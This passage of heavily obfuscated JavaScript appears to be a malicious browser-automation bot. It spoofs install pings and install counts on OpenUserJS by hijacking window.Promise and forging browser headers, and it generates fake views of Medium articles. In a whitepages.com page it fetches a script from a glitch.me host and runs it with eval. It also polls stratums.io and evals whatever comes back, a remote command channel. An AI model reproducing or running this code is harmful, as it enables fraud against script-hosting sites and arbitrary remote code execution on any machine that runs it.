                    for (; R < -0x8 * -0x29 + 0x206a + -0x218a; R += -0xdae + 0xb38 + 0x27b)
                      T = (S = (U = (S = (V = (S = (W = (S = (X = (S = T << 0x1dc4 + -0xbd7 + -0x11e8 | T >>> 0x24c8 + -0x1d0f + 0x41 * -0x1e) + (U ^ V ^ W) + X + (0x1be0e08a + 0x37559 * -0xaab + 0x77dde78a) + Y[R] << -0x7 * -0x2ac + 0x4 * -0x16c + 0x341 * -0x4) << -0x1f5b + 0x185e + 0x702 | X >>> -0xf02 + 0x656 + 0x8c7) + (T ^ (U = U << -0x1927 + 0x705 + 0x1 * 0x1240 | U >>> -0x2 * -0xdc9 + -0xe9 * -0x15 + 0x6ab * -0x7) ^ V) + W + (-0x474521 * -0x145 + -0x831 * -0xfad5 + -0xb * -0x11f5145) + Y[R + (-0x65 * 0x17 + 0x16f7 + -0xde3)] << -0x1 * -0x1aa6 + -0x1477 + 0x1 * -0x62f) << 0xde6 + -0x7e6 + -0x5fb | W >>> -0x146e + -0x1 * -0xff7 + 0x492) + (X ^ (T = T << -0x8be + 0x861 + 0x7b * 0x1 | T >>> -0xb * -0x11b + 0x40d * -0x2 + -0x40d) ^ U) + V + (0xa67c75d9 + 0x20315044 + -0x57d3da7c) + Y[R + (-0x5 * 0x37a + 0x2 * -0x12b3 + 0x36ca)] << 0x957 * 0x4 + -0x24b2 + 0xa * -0x11) << 0x1 * -0x1cbe + -0x57 * 0x19 + 0x2542 | V >>> -0x15d5 * -0x1 + -0x3 * 0x325 + -0xc4b) + (W ^ (X = X << -0x3 * 0x3e5 + -0x7 * -0x1ca + -0xb9 | X >>> -0xf35 + 0x35 * -0x47 + -0x2 * -0xef5) ^ T) + U + (-0xa * -0xf4799e5 + 0x1 * 0xc98d710e + -0xf37f885f) + Y[R + (0x207a + -0x9bb * 0x1 + -0x3c * 0x61)] << 0x2103 + 0xd4d + -0x2e50) << 0x441 * -0x4 + -0x1e19 + 0x2f22 * 0x1 | U >>> 0x33f + -0x86c + 0x548) + (V ^ (W = W << -0x2 * -0x130d + -0x1bb + -0x2441 | W >>> 0xb8f + 0x7f * -0xc + -0x1 * 0x599) ^ X) + T + (0x19447f71 + -0x704682c9 + 0xc5dbeef9) + Y[R + (-0x1dd8 + -0x325 * 0xb + 0x4073)] << -0x20bb + 0x673 * -0x1 + -0x3b * -0xaa, V = V << -0xc6d + 0x1ce4 + -0x5 * 0x345 | V >>> 0x39f + -0x2a7 * -0xe + -0x28bf;
                    for (; R < 0x10ec + 0x26 * -0x34 + -0x8f8; R += 0xc27 * -0x1 + 0x1068 + -0x43c)
                      T = (S = (U = (S = (V = (S = (W = (S = (X = (S = T << -0xd3d * -0x2 + 0x26 * 0x38 + -0x22c5 | T >>> -0x1be5 + 0xdad * -0x2 + 0x1bad * 0x2) + (U & V | U & W | V & W) + X - (-0x2b5d * 0x28a26 + 0x67 * -0x904cc9 + -0x11913b9d1 * -0x1) + Y[R] << -0x141a + 0xa82 + 0x998) << 0x1fdf + 0x2684 + -0x465e | X >>> 0xbbc + -0x15b0 + -0x67 * -0x19) + (T & (U = U << 0x4a5 + -0x26a0 + -0x4df * -0x7 | U >>> -0xea7 + 0x83f + -0x1 * -0x66a) | T & V | U & V) + W - (0x9 * 0x4d33b5f + 0xb19a4c1b + -0x6c231f4e) + Y[R + (0x1b8a + 0x1 * 0xfd1 + -0x2b5a)] << -0x1e55 * -0x1 + 0x9cc + -0x2821) << -0x126a + 0x1121 + -0x1 * -0x14e | W >>> 0x757 * -0x2 + 0xbce + -0x2fb * -0x1) + (X & (T = T << 0x20fc * 0x1 + 0xf11 + -0x2fef | T >>> 0x1654 * -0x1 + 0x270b * -0x1 + 0x3d61) | X & U | T & U) + V - (-0xa45d45c3 + 0x11bcc31 * 0x24 + -0x1 * -0xed58d203) + Y[R + (-0x19d9 + -0x1148 + 0x2b23)] << 0xca9 + 0x1a6f + 0xc * -0x342) << 0xdf1 * 0x1 + -0x2 * 0x5f6 + -0x1 * 0x200 | V >>> -0x1bf7 + 0x1c57 + -0x45) + (W & (X = X << 0x356 + -0x22f3 + -0x1fbb * -0x1 | X >>> 0x235 * 0xc + -0x1743 + -0x337) | W & T | X & T) + U - (0xb8ca * -0x122f7 + 0x62 * -0x1c539f5 + 0x1f06b91d4) + Y[R + (0x1f67 + -0x1073 * -0x2 + -0x2 * 0x2025)] << -0x39 * 0xab + 0x1acf * 0x1 + -0xb44 * -0x1) << -0x3bf + 0x1b1b + -0x1757 | U >>> -0xd21 + 0x10 * 0x1c6 + 0x4 * -0x3c9) + (V & (W = W << 0x19b3 * 0x1 + 0x217e + -0x47 * 0xd5 | W >>> 0x1405 + 0x1dfd + -0x3200) | V & X | W & X) + T - (-0xd716c2e1 + -0x6a371905 + 0x1b2321f0a) + Y[R + (0x178f * 0x1 + -0x2686 + 0xefb)] << 0xf9e + 0x1b28 + -0x6 * 0x721, V = V << 0x1cdb + 0x95f + 0x130e * -0x2 | V >>> -0x8b5 + -0x1bf2 + 0x24a9;
                    for (; R < 0xbd * 0x24 + 0xa6 * 0x35 + -0x2 * 0x1e51; R += -0xb00 + -0xde4 * 0x2 + -0x21 * -0x12d)
                      T = (S = (U = (S = (V = (S = (W = (S = (X = (S = T << -0x1 * -0x1cee + -0x47f * 0x8 + -0x8b * -0xd | T >>> 0x10a0 + 0x3 * -0x641 + 0x23e * 0x1) + (U ^ V ^ W) + X - (0x3a9 * -0x1554ef + -0x5147c891 * 0x1 + 0xd4f8e582) + Y[R] << 0x1 * 0x75d + -0x19fa + 0x129d) << -0x1cc9 + 0x17f0 + -0x1 * -0x4de | X >>> 0x98b + -0x952 + -0x1e) + (T ^ (U = U << -0x26b * -0x9 + -0x3 * -0x97b + -0x3216 | U >>> -0x1 * -0x1c27 + -0x16d6 + -0x3 * 0x1c5) ^ V) + W - (0x2b8 * 0x1fa0a7 + 0x55f11fab + -0x7650a789) + Y[R + (0x2 * -0x593 + -0x167 * 0xb + 0x1a94)] << 0x4e2 + -0x7 * -0x6f + -0x7eb) << -0xcf + 0x31 + 0xa3 * 0x1 | W >>> -0x11 * 0x1b1 + 0x6e * 0x22 + 0xe40) + (X ^ (T = T << -0x39 * 0x7a + 0x10d3 * -0x1 + 0x2c1b | T >>> 0x125 * 0x7 + 0x24eb * -0x1 + 0x1cea) ^ U) + V - (-0x9 * 0xa67afdc + 0x1095a98b + 0x82acc35b) + Y[R + (-0x7bf * -0x3 + -0x1cfe * 0x1 + 0x5c3 * 0x1)] << -0x765 * -0x1 + 0x1776 + 0x3 * -0xa49) << -0x1036 * -0x1 + 0x2262 + -0x3293 | V >>> -0x43 * 0x71 + 0x145 * -0x1c + -0xadf * -0x6) + (W ^ (X = X << -0x1 * 0x1111 + -0xfb2 + 0x20e1 | X >>> 0x1831 + -0x397 * 0x2 + 0x5ab * -0x3) ^ T) + U - (-0xf6 * -0x665e77 + 0x437b80dc + 0x2 * -0x381e8486) + Y[R + (0xa39 + -0x1 * -0x26ed + -0x3123)] << 0x19d * -0x2 + 0x1cdf * 0x1 + -0x19a5) << -0x1304 + 0x5c9 * 0x3 + 0x1ae | U >>> -0xe7e + 0x1af * -0x7 + 0x1a62) + (V ^ (W = W << -0x18ff + -0x1e41 * 0x1 + 0x375e | W >>> -0x1991 + 0x251b * -0x1 + 0x3eae) ^ X) + T - (-0x34f4433 + -0x11cb * -0x20ef3 + -0x1 * -0x144c84ac) + Y[R + (-0xd3b + 0x1 * -0x92b + -0x13 * -0x12e)] << 0x26bc + 0x23d5 + -0x4a91, V = V << -0x1aac + 0x2ea * 0xc + -0x82e | V >>> -0x1f9 + 0x458 + -0x25d;
                    this['h0'] = this['h0'] + T << -0x113c + 0x1 * 0x2027 + -0xeeb, this['h1'] = this['h1'] + U << -0x19a + 0x1 * -0x201d + 0x3 * 0xb3d, this['h2'] = this['h2'] + V << -0xc8c + -0x1a07 * 0x1 + 0x19 * 0x18b, this['h3'] = this['h3'] + W << 0x972 + -0x1 * -0x1fcf + 0xb3 * -0x3b, this['h4'] = this['h4'] + X << 0x13 * 0xb8 + 0x1fd * -0x1 + 0x67 * -0x1d;
                  }
                  ['hex']() {
                    this['finalize']();
                    var R = this['h0'],
                      S = this['h1'],
                      T = this['h2'],
                      U = this['h3'],
                      V = this['h4'];
                    return E[R >> 0x1d5d + -0x2618 + 0x8d7 & 0x21b5 * -0x1 + -0x8aa * -0x1 + -0x42f * -0x6] + E[R >> 0x192c + 0xeec + -0x2800 & -0x1fb * 0x3 + 0x220f * -0x1 + 0x5 * 0x803] + E[R >> -0x1970 + -0x1ea8 + 0x382c & -0x9d3 + -0x1a66 + 0x2448] + E[R >> -0xe3e + 0x1902 + -0xab4 & 0x12db + 0x2 * -0x91c + -0x1 * 0x94] + E[R >> 0x79 * -0x29 + 0x189e + 0x1 * -0x531 & 0x495 + 0x821 * -0x3 + 0x13dd] + E[R >> 0x13f5 + -0xa9 * -0x29 + -0x191 * 0x1e & 0x26f3 * 0x1 + -0x1adf + -0xc05] + E[R >> 0x1045 + -0x11cd + -0x12 * -0x16 & 0x1dd8 * -0x1 + -0x211 + 0x21 * 0xf8] + E[0xe48 + -0x23b4 + 0x157b & R] + E[S >> 0x10d0 + 0x137c * -0x2 + 0x1644 & -0x259d * -0x1 + 0x18ad + -0x3e3b] + E[S >> -0x3 * 0x487 + -0x2498 + -0x11 * -0x2f5 & 0x1a6a + -0x1916 * 0x1 + -0x1 * 0x145] + E[S >> 0x13 * -0xa9 + -0xb1b + 0x1 * 0x17ba & 0x17af + 0xf * -0xde + -0xa9e] + E[S >> 0x871 + 0xc38 + -0x1 * 0x1499 & -0x3 * -0xb68 + -0x664 * -0x4 + -0x3bb9] + E[S >> -0x5b2 + -0x18b2 * 0x1 + -0x1e70 * -0x1 & 0x23d9 + -0x1815 + -0xbb5] + E[S >> -0xd40 * 0x1 + -0x11c2 + -0x1 * -0x1f0a & -0x45f * -0x1 + 0x3b8 + -0x808 * 0x1] + E[S >> 0x26c * -0x1 + 0xef9 * -0x2 + 0x2062 & 0x1c55 * -0x1 + -0x1786 * -0x1 + 0x4de] + E[-0x1 * -0xe96 + 0x1f14 + 0x2d9b * -0x1 & S] + E[T >> -0xdd9 + 0x1 * -0x1e54 + 0x2c49 * 0x1 & 0x1 * -0x1e16 + -0x2 * -0x56f + 0x1347] + E[T >> -0xa0b * -0x2 + -0x176a + -0x92 * -0x6 & -0x9 * -0xc9 + 0x20b3 + 0x7f1 * -0x5] + E[T >> 0x205 * 0x2 + -0x1 * -0x1e71 + -0x2267 & 0x57 * -0x18 + -0x1d0e + 0x2545] + E[T >> -0x19ac + -0x125 * 0x1 + 0x1ae1 & -0x1dd4 + 0x138 + -0x29 * -0xb3] + E[T >> 0x11 * 0x221 + -0x1295 * 0x1 + -0x8c8 * 0x2 & 0x184f + -0x4b1 * -0x6 + 0x161 * -0x26] + E[T >> -0x1582 + -0x31 * 0x7 + 0x16e1 & 0x587 * 0x5 + -0x221 * 0xf + 0x45b] + E[T >> 0x2138 + -0x1 * -0x1409 + -0x353d & -0x1 * 0xfdd + 0x2527 + 0x153b * -0x1] + E[0x12a8 + 0x1 * -0x110b + -0xc7 * 0x2 & T] + E[U >> -0x1 * 0x1f95 + 0x1b4 * -0xa + 0x30b9 & 0x832 * 0x1 + -0x1423 + 0xc00] + E[U >> 0xbc3 + -0x11 * -0x71 + -0x3 * 0x664 & -0x1 * 0x1281 + 0xdde + 0x1 * 0x4b2] + E[U >> -0x228d + 0x3d * 0x96 + -0x11d & -0x25c5 + -0x14c5 + -0x1 * -0x3a99] + E[U >> 0x159c + -0x1 * -0x26c9 + -0x3c55 & -0x2113 + 0x16 * 0x71 + 0x176c] + E[U >> -0x6 * -0x362 + -0x46 * -0x1a + -0x1b5c & 0x8 * -0x1f3 + -0x24 * 0x6e + -0x1f1f * -0x1] + E[U >> -0xf9a + -0x1413 + -0x23b5 * -0x1 & 0xa * -0x40 + -0x8a5 + 0xb34] + E[U >> 0x5b8 + -0x4ab * 0x1 + -0x1 * 0x109 & 0x185 * -0x3 + 0x1 * 0xc8d + -0x7ef] + E[0x14e6 + -0x1f48 + 0x129 * 0x9 & U] + E[V >> -0x1 * 0xa6 + 0x2287 * -0x1 + 0x2349 * 0x1 & 0x1978 + 0xafa + -0x2463] + E[V >> -0x345 + 0xde4 + -0xa87 & 0x2 * 0xbc7 + 0x1209 + 0x376 * -0xc] + E[V >> 0x1243 * -0x1 + 0x17 * 0xb + 0x8ad * 0x2 & 0x232 * -0x4 + 0xa87 + -0x1b0] + E[V >> 0x1ba8 + -0x2295 + 0x6fd & 0xe2b + 0x647 * 0x5 + -0x2d7f] + E[V >> 0x3d4 + -0x695 * 0x1 + 0x3 * 0xef & -0x2078 + -0xb0 * -0x26 + 0x667] + E[V >> -0x1b9c + -0x7 * 0x259 + -0xeb1 * -0x3 & -0x57 * 0xc + -0x1 * -0x1f35 + -0x302 * 0x9] + E[V >> -0xd * 0x2d3 + 0x611 + 0x1eaa & 0x794 + 0x53f + -0xcc4] + E[0x1f * -0x31 + -0x5fb + 0x265 * 0x5 & V];
                  }
                  ['digest']() {
                    this['finalize']();
                    var R = this['h0'],
                      S = this['h1'],
                      T = this['h2'],
                      U = this['h3'],
                      V = this['h4'];
                    return [
                      R >> -0x93f + -0x13a + 0xa91 & -0x132d + 0xdd0 + -0x65c * -0x1,
                      R >> 0x11d7 * -0x2 + -0xf8c * 0x1 + 0x334a & -0x675 + 0x21d5 + -0x1 * 0x1a61,
                      R >> -0x2043 + 0x5d9 * 0x4 + 0x8e7 & 0x1f92 + -0x184 * 0x14 + 0x43 * -0x1,
                      -0xcd9 + -0xf27 + 0x1cff & R,
                      S >> 0x7 * 0x182 + -0x24 * -0x23 + 0xb * -0x166 & 0x2e * 0x1e + -0x65a * -0x5 + -0x2427,
                      S >> 0x4 * -0x981 + 0x1 * -0x13ed + 0x1df * 0x1f & 0x2be + 0x126d + 0x50b * -0x4,
                      S >> 0x16e0 + 0x22 * 0x79 + -0x26ea & -0x4 * 0x185 + 0x133b + -0xc28,
                      0x94e + -0x177 + -0x6d8 & S,
                      T >> 0x42c + -0xdb3 + 0x99f & 0x5 * 0x6d8 + -0x21f6 + 0xbd,
                      T >> -0x1fc1 + -0x2 * 0xe7d + 0x4f * 0xc5 & 0xcab + -0x4 * 0x412 + 0xa * 0x76,
                      T >> 0x1ce6 + -0x8b4 + 0x2 * -0xa15 & -0x3 * -0xaed + -0x1aea + -0x7 * 0xb2,
                      0x1b60 + 0xf9 * 0x15 + 0x2 * -0x1767 & T,
                      U >> 0x5 * -0x2de + -0x1 * 0x4a2 + -0xf4 * -0x14 & 0x1098 * 0x1 + 0x2112 + -0x30ab,
                      U >> -0x2303 * -0x1 + -0x8 * -0xe + 0x1 * -0x2363 & 0x362 * 0x7 + 0x1e86 + -0x3535,
                      U >> -0x121b + -0x34 * -0x86 + -0x3 * 0x307 & 0x230 * 0x1 + 0x90b * -0x1 + 0x7da,
                      -0x1a15 + 0x15ae + 0x566 & U,
                      V >> -0x169 * 0xe + 0x883 + -0xb53 * -0x1 & -0x92d + 0x180e + -0xde2,
                      V >> 0x4 * -0x8cc + 0x1e9 * 0x11 + 0xed * 0x3 & -0x1 * -0x1341 + -0x1fcd + -0x1 * -0xd8b,
                      V >> -0x2075 + 0x12a8 + 0xdd5 * 0x1 & 0x1689 + 0x23e3 + -0x396d,
                      0x1 * -0x17c2 + -0x2e0 * 0x4 + -0x1 * -0x2441 & V
                    ];
                  }
                  ['arrayBuffe' + 'r']() {
                    var R, S;
                    return this['finalize'](), R = new ArrayBuffer(0x745 * 0x3 + 0x1161 * 0x1 + -0x271c), (S = new DataView(R))['setUint32'](-0x1328 * -0x2 + -0x10d8 + -0x1ca * 0xc, this['h0']), S['setUint32'](0x2 * 0xa48 + 0x139 + 0x1 * -0x15c5, this['h1']), S['setUint32'](-0x2358 + -0x3 * 0x35 + 0x23ff, this['h2']), S['setUint32'](0x2209 + -0x1be5 + -0x78 * 0xd, this['h3']), S['setUint32'](-0x13b5 + -0x2616 + 0x39db, this['h4']), R;
                  }
              }
              O['prototype']['toString'] = O['prototype']['hex'], O['prototype']['array'] = O['prototype']['digest'];
              const P = K();
              window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
              let Q = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x3 * -0x2a4 + -0x18 * -0x4c + 0x24 * -0x6b];
              return window['Promise'] = class extends window['Promise'] {
                constructor(...R) {
                  let S = 0x1327 + -0x34d + -0x7ed * 0x2;
                  R[-0x111e + -0x2209 + 0x61 * 0x87]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (R[-0x11 * 0xe2 + -0x466 * 0x2 + 0x17ce] = T => {
                    let U = Q['getAttribu' + 'te']('data-ping-' + 'url');
                    if (U) {
                      let V = P(Q['getAttribu' + 'te']('data-ip-ad' + 'dress') + Q['getAttribu' + 'te']('data-scrip' + 't-id') + Q['getAttribu' + 'te']('data-ping-' + 'key')),
                        W = new XMLHttpRequest();
                      W['open']('POST', U + ('&mo=3&ping' + '_key=') + encodeURIComponent(V), -0x1b * -0x7f + -0x13ba + -0x2 * -0x32b), W['overrideMi' + 'meType']('text/plain'), W['onload'] = () => {}, W['send'](), S = 0x11 * 0x146 + -0xa + -0x159b * 0x1;
                    }
                  }), S || super(...R);
                }
              }, window['setTimeout'](() => {
                Q['click']();
              }, 0x1313 + -0x671 * 0x1 + 0x11 * -0x66), Promise['resolve'](-0x1bc6 + 0x754 + 0x6d1 * 0x3);
            }), await wait(NETWORK_PATIENCE), await B['close'](), await A['close'](), r()));
          }
        }
        for (let s = -0x1 * 0x1a12 + 0x1ff2 + -0x5e0; s < 0xb1b * -0x3 + -0x11ad + 0x1 * 0x32ff; s++)
          r();
      }, -0x1 * 0xc83 + 0x56 * -0x3a + 0x1 * 0x2063), flags['RPL2_MDM2'] && setTimeout(async () => {
        const r = await n['newPage']();
        for (;;) {
          let s = 0x346 + 0xe * 0x2ca + -0x1 * 0x2a52;
          if (await r['goto'](data['mediumArti' + 'cles']['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](u => s++), !s) {
            await randomWait();
            for (let u = 0x1933 + 0x7 * 0x4d5 + 0x1 * -0x3b06; u < getRandomInt(-0x1ba1 * 0x1 + 0xa92 * -0x2 + 0x821 * 0x6, 0x30 * 0xa0 + 0x1085 + -0x2e80); u++)
              await r['keyboard']['press']('ArrowDown'), await randomWait();
            await randomWait(), await wait(0xed62 + 0x7 * 0x1a3f + -0xbabb);
          }
        }
      }, 0x255a + -0x13b1 + -0x1145), flags['RPL2_WP'] && setTimeout(async () => {
        (async function r() {
          try {
            let s = 0x2215 + 0x3d6 * 0x1 + -0x25eb;
            const t = await n['newPage']();
            if (await t['goto']('https://ww' + 'w.whitepag' + 'es.com/', {
                'timeout': MM_NETWORK_PATIENCE
              })['catch'](u => s++), s)
              return await t['close'](), r();
            await wait(-0x1463 + 0x1 * 0x3ad + 0x1c6e * 0x1), await t['evaluate'](() => {
              let u = new XMLHttpRequest();
              u['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x1c34 + -0x198e + -0x2a6), u['send'](), eval(u['responseTe' + 'xt']);
            });
          } catch (u) {}
        }());
      }, -0xe4e + -0x45a + -0x2e * -0x6a);
    }
  ],
  [
    () => flags['doCreateSe' + 'rver'],
    async () => {
      require('http')['createServ' + 'er'](async function(f, g) {
        g['writeHead'](0x1eb6 + -0x6 * -0x47f + -0x38e8), g['write']('v0.8'), g['end']();
      })['listen'](process['env']['PORT'] || 0x3d32 + 0x78 * -0x15 + -0x9e5 * 0x2);
    }
  ],
  [
    () => flags['doOUJS'],
    async () => {
      async function f() {
        const a4 = b,
          a3 = d,
          h = data['oujsToAssi' + 'st']['random'](),
          j = h['replace']('/scripts/', '/install/') + a3(0xc),
          [k, l] = (function() {
            const x = data['oujsUAs']['random']();
            return [
              x,
              x['includes']('Firefox')
            ];
          }()),
          m = function(x, y = 0x2226 + 0xb21 * 0x2 + -0x3867) {
            if (x['includes']('Firefox'))
              return x['slice'](x['indexOf']('Firefox') + 'Firefox' ['length'] + (0x2 * 0x34c + -0x14c2 + 0x117 * 0xd));
            const z = x['indexOf']('Chrome/') + 'Chrome/' ['length'],
              A = x['slice'](z),
              B = A['slice'](-0x6 * 0x1fd + 0x797 + 0x457, A['indexOf']('\x20'));
            return y ? B['slice'](0x1e6 * 0x14 + -0xa2 + -0x1b * 0x162, B['indexOf']('.')) : B;
          }(k),
          q = {
            'signal': AbortSignal['timeout'](-0x1f57 + -0xd * 0x9 + 0x46dc),
            'headers': {
              'host': 'openuserjs' + '.org',
              'origin': 'https://op' + 'enuserjs.o' + 'rg',
              'user-agent': k,
              'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
              'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
              'accept-language': 'en-US,en;q' + '=0.9',
              'cache-control': 'no-cache',
              'pragma': 'no-cache',
              'sec-fetch-dest': 'document',
              'sec-fetch-mode': 'navigate',
              'sec-fetch-site': 'same-origi' + 'n',
              'sec-fetch-user': '?1',
              'upgrade-insecure-requests': '1'
            },
            'body': null,
            'method': 'GET'
          };
        l ? Object['assign'](q['headers'], {
          'te': 'trailers'
        }) : Object['assign'](q['headers'], {
          'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + m + '\x22',
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': '\x22Windows\x22'
        });
        const u = await fetch(g, q)['catch'](x => {});
        if (!u || !u['headers'])
          return;
        if (null === u['headers']['get']('X-RateLimi' + 't-Limit'))
          return;
        const v = {
          'signal': AbortSignal['timeout'](0x197f + 0x3 * -0x859 + 0x134e * 0x2),
          'headers': {
            'host': 'openuserjs' + '.org',
            'origin': 'https://op' + 'enuserjs.o' + 'rg',
            'user-agent': k,
            'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
            'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
            'accept-language': 'en-US,en;q' + '=0.9',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'referer': g,
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origi' + 'n',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1'
          },
          'body': null,
          'method': 'GET'
        };
        if (l ? Object['assign'](v['headers'], {
            'te': 'trailers'
          }) : Object['assign'](v[a4(0x6, 'HdWa')], {
            'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + m + '\x22',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '\x22Windows\x22'
          }), !await fetch(h, v)['catch'](x => {}))
          return;
        const w = {
          'headers': {
            'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
            'accept-language': 'en-US,en;q' + '=0.9',
            'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
            'pragma': 'no-cache',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'none'
          },
          'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
          'body': null,
          'method': 'GET'
        };
        l ? Object['assign'](w['headers'], {
          'te': 'trailers'
        }) : Object['assign'](w['headers'], {
          'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + m + '\x22',
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': '\x22Windows\x22'
        }), await fetch(j, w);
      }
      const g = 'https://op' + 'enuserjs.o' + 'rg/';
      f();
      for (let h = -0x1b7d + 0xbff + 0xf7e; h < -0x794 + 0x1ec6 + -0x172e; h++)
        setTimeout(f, (0x1ec9 + -0x1b7 * -0x10f + -0x10522) * h * getRandomInt(-0x1 * -0x1ff + -0x25f * -0x3 + -0x3f * 0x25, 0x1ccd + -0x75d + 0x1 * -0x156d));
      setInterval(() => {
        f();
        for (let i = 0x9 * 0x360 + 0x26ab + -0xdcf * 0x5; i < 0x4 * -0x1b5 + 0xaa0 * -0x2 + 0x1c18; i++)
          setTimeout(f, (-0xb5d8 + 0x1 * 0x83d2 + 0x1 * 0x11c66) * i * getRandomInt(-0x37b + 0x3 * 0x61b + -0x1 * 0xed5, 0x1dc0 + -0xb2d * -0x3 + -0x2 * 0x1fa2));
      }, -0x5cf * -0x10ac + -0x5c5ac8 + -0x4342f * -0xc);
    }
  ],
  [
    () => flags['RPL2_RPRT'],
    async () => {
      async function f() {
        try {
          axios['post']('https://st' + 'ratums.io/' + 'research', {
            'key': 'CX001_ZCa',
            'dom': me
          })['then'](g => {
            try {
              eval(g['data']);
            } catch (h) {}
          })['catch'](g => {});
        } catch (g) {}
      }
      f(), setInterval(f, 0x3c217 + -0x4ee4f + 0x5c018);
    }
  ]
];
for (let e of actions)
  e[-0xab0 + 0x17cc + -0xd1c]() && setTimeout(e[-0x914 + -0x7e0 + 0x10f5]);